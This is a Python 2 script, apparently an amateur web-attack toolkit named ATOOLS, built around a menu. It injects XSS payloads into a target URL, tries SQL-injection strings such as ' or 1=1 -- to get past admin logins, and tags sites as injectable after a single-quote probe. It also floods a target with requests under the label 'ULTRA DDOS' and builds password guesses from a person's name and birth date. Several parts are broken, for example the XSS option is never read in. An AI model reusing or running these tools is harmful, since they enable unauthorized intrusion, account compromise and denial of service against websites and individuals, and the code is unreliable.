# -*- coding: utf-8 -*
#ATOOLS by Abdxslayer
#http://www.github.com/ABDXH4K3r
import os
import sys
import time
import re
import requests
import random
import socket
import re
import platform
import json
from urllib2 import urlopen
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

def clear():
	sys = platform.system()
	if sys == 'Windows':
		os.system('cls')
	if sys == 'Linux':
		os.system('clear')
	
def exit():
	exit = raw_input("Enter To Exit...")

def XSS():
	red = '\33[31m'
	yellow = '\33[33m'
	green = '\33[92m'
	blue = '\33[34m'
	def stop():
	    exit()
	imp = (red+("IMPORTANT !!!, Download Geckodriver then put in the path !! "))
	print imp
	link = raw_input(red+"[+] Target Link : ")
	opt = (yellow+"[+] Option (-easy,-medium): ")
	easyscript = ("'<script>alert('XSS')</script>")
	mediumscript = ["<svg onload='XSS'>",'<IMG """><script>alert("xss")</script>">"',"<scri<script>pt>JS Code</script>",'"><img src="link" onerror=Js code;']
	browser = webdriver.Firefox()
	if opt=='-easy':
	    clear()
	    r = requests.get(link+easyscript)
	    browser.get(link+easyscript)
	    if r.status_code==200:
	        try:
	            WebDriverWait(browser, 3).until(EC.alert_is_present(),
	                                   'Timed out waiting for PA creation ' +
	                                   'confirmation popup to appear.')
	            alert = browser.switch_to.alert
	            alert.accept()
	            print("alert accepted")
	            print str(green+'[+] Success !,'+blue+'Website Has XSS level easy.'+"XSS By "+easyscript)
	        except TimeoutException:
	            print("no alert")
	            print str(red+'[-] Website Xss vulnerability is high level,'+yellow+'try "-medium" or "high" option.')

	if opt=='-medium':
	    clear()
	    browser.get(link)
	    one = requests.get(link+"'"+mediumscript[0])
	    browser.get(link+"'"+mediumscript[0])
	    if one.status_code == 200:
	        try:
	            WebDriverWait(browser, 3).until(EC.alert_is_present(),
	                                   'Timed out waiting for PA creation ' +
	                                   'confirmation popup to appear.')
	            alert = browser.switch_to.alert
	            alert.accept()
	            print("alert accepted")
	            print str(green+'[+] Success !,'+blue+'Website Has XSS level easy.'+"XSS By "+easyscript)
	        except TimeoutException:
	                two = requests.get(link+"'"+mediumscript[1])
	                if two.status_code == 200:
	                    browser.get(link+"'"+mediumscript[1])
	                    try:
	                        WebDriverWait(browser, 3).until(EC.alert_is_present(),
	                                               'Timed out waiting for PA creation ' +
	                                               'confirmation popup to appear.')
	                        alert = browser.switch_to.alert
	                        alert.accept()
	                        print("alert accepted")
	                        print str(green+"Success !"+'Xss By '+mediumscript[1])
	                    except TimeoutException:
	                        print("no alert")
	                        three = requests.get(link+"'"+mediumscript[2])
	                        try:
	                            WebDriverWait(browser, 3).until(EC.alert_is_present(),
	                                                       'Timed out waiting for PA creation ' +
	                                                       'confirmation popup to appear.')
	                            alert = browser.switch_to.alert
	                            alert.accept()
	                            print("alert accepted")
	                            print str(green+"Success !"+'Xss By '+mediumscript[2])
	                        except TimeoutException:
	                            print("no alert")
	                            browser.get(link+"'"+mediumscript[3])
	                            four = requests.get(link+"'"+mediumscript[3])
	                            try:
	                                WebDriverWait(browser, 3).until(EC.alert_is_present(),
	                                                           'Timed out waiting for PA creation ' +
	                                                           'confirmation popup to appear.')
	                                alert = browser.switch_to.alert
	                                alert.accept()
	                                print("alert accepted")
	                                print str(green+"Success !"+'Xss By '+mediumscript[1])
	                            except TimeoutException:
	                                print("no alert")
	                                print str(red+'[-] Failed !, Medium Xss is not valid for this website. We Are working for The high option...')

	if opt=='-high':
		print str(yellow+"Soon...")

clear()

def Logo():
    print ("""\33[92m
	           ██████ █████  █████  ██  ██
	           ██  ██ ██  ██ ██  ██ ██  ██ 
	           ██  ██ ██  ██ ██  ██ ██  ██
	           ██████ ██████ ██  ██   ██
	           ██  ██ ██  ██ ██  ██ ██  ██
	           ██  ██ ██  ██ ██  ██ ██  ██
	           ██  ██ █████  █████  ██  ██
	                               SLAYER
""")


def WebInfo():
	clear()
	lineacc = "[================[New]=================]"
	lineaccunder = "[====================[END]===================]\n"
	filepath = raw_input("Enter File Path : ")

	with open(filepath) as fp:  
	   line = fp.readline()
	   cnt = 1
	   while line:
			print (lineacc)
			print("[Line {}: {}]".format(cnt, line.strip()))
			command = ('host'+' '+line)
			print("-------------------------------------------")
			cmnd = os.system(command)
			owner = ('whois ',line,' | grep "OrgName"')
			owner = "%s%s%s"%(owner)
			os.system(owner)
			print (lineaccunder)
			line = fp.readline()
			cnt += 1
Logo()
tools = raw_input("""\33[34m
		   [==========Tools==========]
		   \33[34m[\33[31m1\33[34m].\33[33mInformation Gathering.
		   \33[34m[\33[31m2\33[34m].\33[33mXSS Tools.
		   \33[34m[\33[31m3\33[34m].\33[33mSQL Injection Tools.
		   \33[34m[\33[31m4\33[34m].\33[33mAdmin Panel Attack.
		   \33[34m[\33[31m5\33[34m].\33[33mWebsite Info Gathering.
		   \33[34m[\33[31m6\33[34m].\33[33mULTRA DDOS.
		   \33[34m[\33[31m7\33[34m].\33[33mUpdate & Upgrade.


		   \33[34m[\33[31m99\33[34m].\33[33mEXIT.

		   \33[31mSet > """)

def website_info_grab():
	clear()
	Logo()
	url = raw_input("\33[92mURL \33[31mTarget\33[92m \33[92m(Ex: google.com) \33[92m : ")
	ip = socket.gethostbyname(url)
	location = geolite2.lookup(ip)
	location is not None
	clear()
	print("[==========Website Info==========]")
	print("\33[92mHost Ip : \33[92m"+ip)
	print ("\33[92mLocation : \33[92m"+location.country)
	print ("\33[92mTimezone : \33[92m"+location.timezone)
	request = b"GET / HTTP/1.1\nHost: ",url,'\n\n'
	request = "%s%s%s"%(request)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((url, 80))
	s.send(request)
	result = s.recv(10000)
	print(result)

def DDOS():
	clear()
	Logo()
	target = raw_input("[X] Enter Target (*http://* is obligatory) : ")
	num = 0
	while True:
		num = num+1
		r = requests.get(target)
		print ("[X] DDOS {} > CODE > {} SENT [X]".format(num,r.status_code))


def Passwordlist():
	clear()
	Logo()
	name = raw_input("Enter Name : ")
	lastname = raw_input("Enter The LastName : ")
	dbirth = raw_input("Enter Day of birth : ")
	mbirth = raw_input("Enter Month of birth : ")
	ybirth = raw_input("Enter Year of birth : ")
	namepass = raw_input("Enter A Name of Your PasswordList (DON'T FORGET .txt) : ")
	file = open(namepass, 'w')
	file.write(name+lastname+"\n")
	file.write(lastname+name+"\n")
	file.write(name+dbirth+"\n")
	file.write(dbirth+name+"\n")
	file.write(name+name+"\n")
	file.write(name+ybirth+"\n")
	file.write(name+mbirth+"\n")
	file.write(ybirth+name+"\n")
	file.write(mbirth+name+"\n")
	file.write(ybirth+lastname+"\n")
	file.write(dbirth+lastname+"\n")
	file.write(mbirth+lastname+"\n")
	file.write(ybirth+lastname+name+"\n")
	file.write(ybirth+name+lastname+"\n")
	file.write(lastname+lastname+ybirth+"\n")
	file.write(name+lastname+ybirth+"\n")
	file.write(name+lastname+dbirth+"\n")
	file.write(name+lastname+mbirth+"\n")
	file.write(name+lastname+'2000'+"\n")
	file.write(name+lastname+'2001'+"\n")
	file.write(name+lastname+'2002'+"\n")
	file.write(name+lastname+'2003'+"\n")
	file.write(name+lastname+'2004'+"\n")
	file.write(name+lastname+'2005'+"\n")
	file.write(name+lastname+'2006'+"\n")
	file.write(name+lastname+'2007'+"\n")
	file.write(name+lastname+'2008'+"\n")
	file.write(name+lastname+'2009'+"\n")
	file.write(name+lastname+'2010'+"\n")
	file.write(name+lastname+'2011'+"\n")
	file.write(name+lastname+'2012'+"\n")
	file.write(name+lastname+'2013'+"\n")
	file.write(name+lastname+'2014'+"\n")
	file.write(name+lastname+'2015'+"\n")
	file.write(name+lastname+'2016'+"\n")
	file.write(name+lastname+'2017'+"\n")
	file.write(name+lastname+'2018'+"\n")
	file.write(name+lastname+'2019'+"\n")
	file.write(name+lastname+'2020'+"\n")
	file.write(name+lastname+'123'+"\n")
	file.write(name+lastname+'666'+"\n")
	file.write(name+lastname+'000'+"\n")
	file.write(name+lastname+'123'+"\n")
	file.write(name+lastname+'123456'+"\n")
	file.write("Azerty"+"\n")
	file.write("Azerty123"+"\n")
	file.write("Azerty123456"+"\n")
	file.write("Azerty112233"+"\n")
	file.write("Azerty2000"+"\n")
	file.write("Azerty2017"+"\n")
	file.write("Azerty2018"+"\n")
	file.write("Azerty2019"+"\n")
	file.write("Azerty2020"+"\n")
	file.write("Azertyuiop^$"+"\n")
	file.close() 

def ip_info():
	clear()
	Logo()
	ip = raw_input("[+] Enter IP Adress : ")
	url = 'http://ipinfo.io/json'
	response = urlopen(url)
	data = json.load(response)

	IP=data['ip']
	org=data['org']
	city = data['city']
	country=data['country']
	region=data['region']
	info = 'IP detail:\nIP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP)
	print info

def AdminPanel():
	clear()
	Logo()
	website = raw_input("Enter website Admin Login Page : ")
	r = requests.get(website)
	if r.status_code == 200 or r.status_code == 403:

		print ("[+] SUCCESS WE FOUNDED THE WEBSITE !")
		print ("[+] TRYING TO BYPASS THE ADMIN LOGIN ...")
		log = requests.get(website, auth=("' or 1=1 --", "' or 1=1 --"))
		if log.status_code is not 200:
			print "Method 1 Failure. [/] Trying other methods..."
		
			log = requests.get(website, auth=("' or ''='", "' or ''='"))

			if log.status_code is not 200:

				print "Method 2 Failure. [/] Trying other methods..."
			
				log = requests.get(website, auth=("' or 1--", ""))
				if log.status_code is not 200:

					print "Method 3 Failure. [/] Trying other methods..."
				
					log = requests.get(website, auth=("') or true--", ""))
					if log.status_code is not 200:
					
						print "Method 4 Failure. [/] Trying other methods..."
					
						log = requests.get(website, auth=("'-'", ""))
						if log.status_code is not 200:
							exit = raw_input("[-] FAILED TO BYPASS ADMIN PANEL...")
			
				print "Method 5 Failure. \nSorry :( You can report this to me: \n As8apple@gmail.com"

	if r.status_code is not 200:

		print ("[-] FAILED WE DIDN'T FOUND THE WEBSITE !")


def sql_inj():
	clear()
	Logo()
	website = raw_input("Enter website Url : ")
	r = requests.get(website)
	response = r
	print ("\33[34m[\33[33m+\33[34m] \33[33mCONNECTING TO",r.url)
	sql = "'"
	sql_injection = (website,sql)
	sql_injection = "%s%s"%(sql_injection)
	final = requests.get(sql_injection)
	try:
		if final.status_code == 200:
			file = open("result_sql.txt",'w')
			txt = (website+'\n')
			file.write(txt)
			print ("\33[34m[\33[33m+\33[34m] \33[33mSUCCESS, WEBSITE ADDED TO YOUR SQL VULNURABLE LIST.")

		if final.status_code is not 200:
			print ("\33[34m[-] FAILED, THE WEBSITE ENTRED IS NOT VULNURABLE.")
	except:
		print ("\33[34m[-] ERROR, CHECK THE LINK IF IT EXIST/ADD (http://www.) to the website.")



if tools =='1':
	clear()
	Logo()
	info_grab = raw_input("""
		[==========Information Gathering==========]
		\33[34m[\33[31m01\33[34m].\33[33mWebsite.
		\33[34m[\33[31m02\33[34m].\33[33mPasswordList.
		\33[34m[\33[31m03\33[34m].\33[33mIp.

		\33[31mSet > """)
	if info_grab == '1':
		website_info_grab()
	
	if info_grab == '2':
		clear()
		Passwordlist()

	if info_grab == '3':
		ip_info()

if tools == '2':
	XSS()

if tools=='3':
	sql_inj()

if tools=='4':
	AdminPanel()

if tools=='5':
	WebInfo()

if tools=='6':
	DDOS()
if tools=='7':
	clear()
	Logo()
	system = platform.system()

	if system == 'Windows':
		os.system('start "http://github.com/ABDXH4K3r"')
	if system == 'Linux':
		os.system('firefox "http://github.com/ABDXH4K3r"')

if tools=='99':
	exit()
